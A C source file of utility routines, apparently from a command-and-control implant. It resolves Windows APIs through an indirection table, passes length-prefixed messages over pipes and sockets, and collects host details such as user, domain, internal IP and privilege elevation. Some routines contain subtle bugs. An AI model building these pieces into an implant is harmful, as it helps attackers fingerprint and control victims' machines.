#include "ApiLoader.h"

//////////

LPVOID MemAllocLocal(DWORD bufferSize) 
{
	return ApiWin->LocalAlloc(LPTR, bufferSize);
	//return ApiWin->HeapAlloc(GetProcessHeap(), 0, bufferSize);
}

LPVOID MemReallocLocal(LPVOID buffer, DWORD bufferSize) 
{
    LPVOID mem = ApiWin->LocalReAlloc( buffer, bufferSize, LMEM_MOVEABLE);
    //LPVOID mem = ApiWin->HeapReAlloc(GetProcessHeap(), 0, buffer, bufferSize);
    return mem;
}

void MemFreeLocal(LPVOID* buffer, DWORD bufferSize) 
{
    if (bufferSize < 0)
        bufferSize = 0;

    memset((PBYTE)*buffer, 0, bufferSize);
	ApiWin->LocalFree(*buffer);
	*buffer = NULL;
    //ApiWin->HeapFree(GetProcessHeap(), 0, *buffer);
    //*buffer = NULL;
}

//////////

BYTE* ReadDataFromAnonPipe(HANDLE hPipe, ULONG* bufferSize)
{
    BOOL  result = FALSE;
    ULONG read = 0;
    static BYTE* buf[0x2000] = { 0 };
    LPVOID buffer = MemAllocLocal(0);
    do {
        DWORD available = 0;
        ApiWin->PeekNamedPipe(hPipe, NULL, 0x1000, NULL, &available, NULL);
        
        if (available > 0) {
            result = ApiWin->ReadFile(hPipe, buf, 0x1000, &read, NULL);
            if (read == 0)
                break;

            *bufferSize += read;

            buffer = MemReallocLocal(buffer, *bufferSize);
            memcpy((BYTE*)buffer + (*bufferSize - read), buf, read);
            memset(buf, 0, read);
        }
        else {
            result = FALSE;
        }

        if (*bufferSize > 0x100000)
            break;

    } while (result);

    return (BYTE*)buffer;
}

BOOL PeekNamedPipeTime(HANDLE hNamedPipe, int waitTime)
{
    DWORD startTickCount = ApiWin->GetTickCount() + waitTime;
    DWORD totalBytesAvail = 0;
    while (1) {
        if (!ApiWin->PeekNamedPipe(hNamedPipe, 0, 0, 0, &totalBytesAvail, 0))
            return 0;

        if (totalBytesAvail)
            break;

        if (ApiWin->GetTickCount() >= startTickCount)
            return 0;

        ApiWin->Sleep(10);
    }
    return 1;
}

int ReadFromPipe(HANDLE hPipe, BYTE* buffer, ULONG bufferSize) 
{
    DWORD NumberOfBytesRead = 0;
    int index = 0;
    while (ApiWin->ReadFile(hPipe, buffer + index, bufferSize - index, &NumberOfBytesRead, 0) && NumberOfBytesRead) {
        index += NumberOfBytesRead;
        if (index > bufferSize)
            return -1;
        
        if (index == bufferSize)
            break;
    }
    return index;
}

int ReadDataFromPipe(HANDLE hPipe, LPVOID* buffer, ULONG* bufferSize)
{
    ULONG dataLength = 0;
    int dataSize = ReadFromPipe(hPipe, (PBYTE)&dataLength, 4);
    if (dataSize == -1 || dataSize != 4)
        return -1;

    if (dataLength == 0)
        return 0;

    *bufferSize = dataLength;
    *buffer = MemAllocLocal(dataLength);

    return ReadFromPipe(hPipe, (PBYTE)*buffer, dataLength);
}

BOOL WriteToPipe(HANDLE hPipe, BYTE* buffer, ULONG bufferSize) 
{
    int index = 0;
    int size;
    DWORD NumberOfBytesWritten = 0;
    while (1) {
        size = bufferSize - index;
        if (bufferSize - index > 0x2000)
            size = 0x2000;

        if (!ApiWin->WriteFile(hPipe, buffer + index, size, &NumberOfBytesWritten, 0))
            return 0;
        
        index += NumberOfBytesWritten;
        if (index >= bufferSize)
            break;
    }
    return TRUE;
}

BOOL WriteDataToPipe(HANDLE hPipe, BYTE* buffer, ULONG bufferSize)
{
    if (WriteToPipe(hPipe, (BYTE*) &bufferSize, 4))
        return WriteToPipe(hPipe, buffer, bufferSize);
    return FALSE;
}


//////////

WORD _htons(WORD hostshort)
{
    return ((hostshort >> 8) & 0x00FF) | ((hostshort << 8) & 0xFF00);
}

ULONG _inet_addr(const char* ip)
{
    if (!ip)
        return 0xFFFFFFFF;

    ULONG result = 0;
    BYTE  octet = 0;
    ULONG dots = 0;

    while (*ip) {
        if (*ip >= '0' && *ip <= '9') {
            octet = octet * 10 + (*ip - '0');
            if (octet > 255)
                return 0xFFFFFFFF;
        }
        else if (*ip == '.') {
            result = (result << 8) | octet;
            octet = 0;
            dots++;
            if (dots > 3)
                return 0xFFFFFFFF;
        }
        else {
            return 0xFFFFFFFF;
        }
        ip++;
    }

    if (dots != 3)
        return 0xFFFFFFFF;

    result = (result << 8) | octet;
    return result;
}

BOOL PeekSocketTime(SOCKET sock, int waitTime)
{
    DWORD startTickCount = ApiWin->GetTickCount() + waitTime;
    DWORD totalBytesAvail = 0;
    while (1) {
        if (ApiWin->ioctlsocket(sock, FIONREAD, &totalBytesAvail) == -1)
            return 0;

        if (totalBytesAvail)
            break;

        if (ApiWin->GetTickCount() >= startTickCount)
            return 0;

        ApiWin->Sleep(10);
    }
    return 1;
}

int ReadFromSocket(SOCKET sock, char* buffer, int bufferSize)
{
    DWORD recvSize;
    ULONG dwReaded = 0;
    if (bufferSize <= 0)
        return dwReaded;

    while (1) {
        recvSize = ApiWin->recv(sock, buffer, bufferSize - dwReaded, 0);
        if (recvSize == 0 || recvSize == -1)
            break;

        buffer += recvSize;
        dwReaded += recvSize;

        if ((int)dwReaded >= bufferSize)
            return dwReaded;
    }
    ApiWin->shutdown(sock, 2);
    ApiWin->closesocket(sock);
    return -1;
}

int ReadDataFromSocket(SOCKET sock, LPVOID* buffer, ULONG* bufferSize)
{
    ULONG dataLength = 0;
    int dataSize = ReadFromSocket(sock, (PCHAR)&dataLength, 4);
    if (dataSize == -1 || dataSize != 4)
        return -1;

    if (dataLength == 0)
        return 0;
    
    *bufferSize = dataLength;
    *buffer = MemAllocLocal(dataLength);

    return ReadFromSocket(sock, (PCHAR)*buffer, dataLength);
}

BOOL WriteToSocket(SOCKET sock, BYTE* buffer, ULONG bufferSize)
{
    int index = 0;
    int size;
    DWORD NumberOfBytesWritten = 0;
    while (1) {
        size = bufferSize - index;
        if (bufferSize - index > 0x1000)
            size = 0x1000;

        NumberOfBytesWritten = ApiWin->send(sock, (const char*)(buffer + index), size, 0);
        if (NumberOfBytesWritten == -1) 
            return FALSE;
        
        index += NumberOfBytesWritten;
        if (index >= bufferSize)
            break;
    }
    return TRUE;
}

BOOL WriteDataToSocket(SOCKET sock, BYTE* buffer, ULONG bufferSize)
{
    if (WriteToSocket(sock, (BYTE*)&bufferSize, 4))
        return WriteToSocket(sock, buffer, bufferSize);
    return FALSE;
}

//////////

ULONG GenerateRandom32()
{
	ULONG seed = ApiWin->GetTickCount();
	seed = ApiNt->RtlRandomEx(&seed);
	seed = seed % ULONG_MAX;
	return seed;
}

BYTE GetGmtOffset() 
{
	TIME_ZONE_INFORMATION temp;
	ApiWin->GetTimeZoneInformation(&temp);
	BYTE diff = temp.Bias / (-60);
	return diff;
}

BOOL IsElevate() 
{
    BOOL            success   = FALSE;
    BOOL            high      = FALSE;
    HANDLE          hToken    = NULL;
    TOKEN_ELEVATION Elevation = { 0 };
    DWORD           cbSize    = sizeof(TOKEN_ELEVATION);

    NTSTATUS NtStatus = ApiNt->NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY, &hToken);
    if (NT_SUCCESS(NtStatus)) {
        success = ApiWin->GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize);
        if (success) 
            high = (BOOL)Elevation.TokenIsElevated;
    }

    if (hToken) {
        ApiNt->NtClose(hToken);
        hToken = NULL;
    }
    return high;
}

ULONG GetInternalIpLong()
{
	ULONG   internalIP      = 0;
	ULONG   success         = 0;
    ULONG   length          = 0;
	IN_ADDR ipAddressObject = { 0 };
	LPCSTR  terminator = NULL;
    ApiWin->GetAdaptersInfo(NULL, &length);
	PIP_ADAPTER_INFO Adapter = (PIP_ADAPTER_INFO)MemAllocLocal(length);
    if ( Adapter ) {

        PIP_ADAPTER_INFO nextAdapter = Adapter;
		success = ApiWin->GetAdaptersInfo(nextAdapter, &length);
		if (success == NO_ERROR ) {
            while (nextAdapter) {

				success = ApiNt->RtlIpv4StringToAddressA(nextAdapter->IpAddressList.IpAddress.String, FALSE, &terminator, &ipAddressObject);
				if ( success == ERROR_SUCCESS && ipAddressObject.S_un.S_addr != 0 ) {
					internalIP = ipAddressObject.S_un.S_addr;
					break;
				}
				nextAdapter = nextAdapter->Next;
            }
        }
        MemFreeLocal((LPVOID*)&Adapter, length);
        nextAdapter = NULL;
    }
    return internalIP;
}

CHAR* _GetUserName()
{
    DWORD length = 0;
    ApiWin->GetUserNameA(NULL, &length);
    CHAR* userName = (CHAR*)MemAllocLocal(length);
    ApiWin->GetUserNameA(userName, &length);
    return userName;
}

CHAR* _GetHostName()
{
    DWORD length = 0;
    ApiWin->GetComputerNameExA(ComputerNameNetBIOS, NULL, &length);
    CHAR* hostName = (CHAR*)MemAllocLocal(length);
    ApiWin->GetComputerNameExA(ComputerNameNetBIOS, hostName, &length);
    return hostName;
}

CHAR* _GetDomainName()
{
    DWORD length = 0;
    ApiWin->GetComputerNameExA(ComputerNameDnsDomain, NULL, &length);
    CHAR* hostName = (CHAR*)MemAllocLocal(length);
    ApiWin->GetComputerNameExA(ComputerNameDnsDomain, hostName, &length);
    return hostName;
}

CHAR* _GetProcessName()
{
    DWORD length = ((PRTL_USER_PROCESS_PARAMETERS)NtCurrentTeb()->ProcessEnvironmentBlock->ProcessParameters)->ImagePathName.Length / 2;
    PWCHAR tmpName = ((PRTL_USER_PROCESS_PARAMETERS)NtCurrentTeb()->ProcessEnvironmentBlock->ProcessParameters)->ImagePathName.Buffer;
    int i = 0;
    for (; tmpName[length - i] != L'\\' && (length - i) >= 0; i++);
    CHAR* processName = (CHAR*)MemAllocLocal(i);
    ApiWin->GetModuleBaseNameA((HANDLE) -1, NULL, processName, i);
    return processName;
}

HANDLE TokenCurrentHandle()
{
    HANDLE TokenHandle = NULL;

    if (!NT_SUCCESS(ApiNt->NtOpenThreadToken(NtCurrentThread(), TOKEN_QUERY, FALSE, &TokenHandle))) {
        if (!NT_SUCCESS(ApiNt->NtOpenThreadToken(NtCurrentThread(), TOKEN_QUERY, TRUE, &TokenHandle))) {
            if (!NT_SUCCESS(ApiNt->NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY, &TokenHandle)))
                return NULL;
        }
    }
    return TokenHandle;
}

BOOL TokenToUser(HANDLE hToken, CHAR* username, DWORD* usernameSize, CHAR* domain, DWORD* domainSize, BOOL* elevated) 
{
    BOOL result = false;
    if (hToken) {
        LPVOID tokenInfo = NULL;
        DWORD  tokenInfoSize = 0;
        
        result = ApiWin->GetTokenInformation(hToken, TokenUser, tokenInfo, 0, &tokenInfoSize);
        if (!result) {
            tokenInfo = MemAllocLocal(tokenInfoSize);
            if (tokenInfo)
                result = ApiWin->GetTokenInformation(hToken, TokenUser, tokenInfo, tokenInfoSize, &tokenInfoSize);
        }

        TOKEN_ELEVATION Elevation = { 0 };
        DWORD eleavationSize = sizeof(TOKEN_ELEVATION);
        ApiWin->GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &eleavationSize);

        if (result) {
            SID_NAME_USE SidType;
            result = ApiWin->LookupAccountSidA(NULL, ((PTOKEN_USER)tokenInfo)->User.Sid, username, usernameSize, domain, domainSize, &SidType);
            if (result) {
                *elevated = Elevation.TokenIsElevated;
            }
        }

        if (tokenInfo)
            MemFreeLocal(&tokenInfo, tokenInfoSize);

    }
    return result;
}

///////////

CHAR* StrChrA(CHAR* str, CHAR c) 
{
    while (*str) {
        if (*str == c)
            return (char*)str;
        str++;
    }

    return NULL;
}

CHAR* StrTokA(CHAR* str, CHAR* delim)
{
    static char* context = nullptr;
    if (str != nullptr)
        context = str;

    if (context == nullptr)
        return nullptr;

    while (*context && StrChrA(delim, *context))
        ++context;

    if (*context == '\0')
        return nullptr;

    char* token_start = context;
    while (*context && !StrChrA(delim, *context))
        ++context;

    if (*context) {
        *context = '\0';
        ++context;
    }

    return token_start;
}

DWORD StrCmpA(CHAR* str1, CHAR* str2)
{
    while (*str1 && (*str1 == *str2)) {
        str1++;
        str2++;
    }

    return (unsigned char)*str1 - (unsigned char)*str2;
}

DWORD StrNCmpA(CHAR* str1, CHAR* str2, SIZE_T n)
{
    while (n > 0 && *str1 && (*str1 == *str2)) {
        str1++;
        str2++;
        n--;
    }

    if (n == 0)
        return 0;
 
    return (unsigned char)*str1 - (unsigned char)*str2;
}

DWORD StrCmpLowA(CHAR* str1, CHAR* str2)
{
    while (*str1 && *str2) {
        char ch1 = *str1;
        char ch2 = *str2;

        if (ch1 >= 'A' && ch1 <= 'Z')
            ch1 += 0x20;
        if (ch2 >= 'A' && ch2 <= 'Z') 
            ch2 += 0x20;

        if (ch1 != ch2)
            return (unsigned char)*str1 - (unsigned char)*str2;

        ++str1;
        ++str2;
    }

    if(*str1 == 0 && *str2 == 0)
        return 0;

    return (unsigned char)*str1 - (unsigned char)*str2;
}

DWORD StrCmpLowW(WCHAR* str1, WCHAR* str2)
{
    while (*str1 && *str2) {
        wchar_t ch1 = *str1;
        wchar_t ch2 = *str2;

        if (ch1 >= L'A' && ch1 <= L'Z')
            ch1 += 0x20;
        if (ch2 >= L'A' && ch2 <= L'Z')
            ch2 += 0x20;

        if (ch1 != ch2)
            return *str1 - *str2;

        ++str1;
        ++str2;
    }

    if (*str1 == L'0' && *str2 == L'0')
        return 0;

    return *str1 - *str2;
}

DWORD StrLenA(CHAR* str)
{
    int i = 0;
    if (str != NULL)
        for (; str[i]; i++);
    return i;
}

DWORD StrIndexA(CHAR* str, CHAR target)
{
    for (int i = 0; str[i] != '\0'; i++) {
        if (str[i] == target)
            return i;
    }
    return -1;
}

ULONG FileTimeToUnixTimestamp(FILETIME ft) 
{
    ULARGE_INTEGER uli;
    uli.LowPart = ft.dwLowDateTime;
    uli.HighPart = ft.dwHighDateTime;

    const DWORD EPOCH_DIFFERENCE_LOW  = 0xD53E8000; 
    const DWORD EPOCH_DIFFERENCE_HIGH = 0x019DB1DE; 

    if (uli.LowPart < EPOCH_DIFFERENCE_LOW) {
        uli.LowPart -= EPOCH_DIFFERENCE_LOW;
        uli.HighPart -= EPOCH_DIFFERENCE_HIGH + 1;
    }
    else {
        uli.LowPart -= EPOCH_DIFFERENCE_LOW;
        uli.HighPart -= EPOCH_DIFFERENCE_HIGH;
    }

    DWORD quotient = 0;
    DWORD remainder = 0;
    for (int i = 63; i >= 0; i--) {
        remainder <<= 1;
        if (i >= 32) {
            remainder |= (uli.HighPart >> (i - 32)) & 1;
        }
        else {
            remainder |= (uli.LowPart >> i) & 1;
        }

        if (remainder >= 10000000) {
            remainder -= 10000000;
            quotient |= (1UL << i);
        }
    }
    return quotient;
}

ULONG GetSystemTimeAsUnixTimestamp()
{
    FILETIME ft;
    ApiWin->GetSystemTimeAsFileTime(&ft);
    return FileTimeToUnixTimestamp(ft);
}

void ConvertUnicodeStringToChar(wchar_t* src, size_t srcSize, char* dst, size_t dstSize)
{
    ApiWin->WideCharToMultiByte(CP_ACP, 0, src, (int)srcSize / sizeof(wchar_t), dst, (int)dstSize, NULL, NULL);
    dst[dstSize - 1] = '\0';
 }
